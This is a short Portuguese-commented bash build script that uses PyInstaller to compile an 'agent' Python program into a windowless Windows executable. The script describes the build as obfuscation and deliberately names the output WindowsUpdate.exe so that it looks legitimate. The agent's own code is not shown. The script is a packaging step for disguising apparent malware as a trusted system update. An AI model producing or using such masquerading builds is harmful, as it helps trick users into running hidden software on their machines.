#!/bin/bash
# agents/build.sh

echo "📦 Compilando agente para Windows executable..."

# Instalar pyinstaller se necessário
pip3 install pyinstaller

# Compilar com ofuscação
pyinstaller --onefile --noconsole --name windows_update agent.py

# Renomear para algo legítimo
mv dist/windows_update.exe dist/WindowsUpdate.exe

echo "✅ Executável criado: dist/WindowsUpdate.exe"
file dist/WindowsUpdate.exe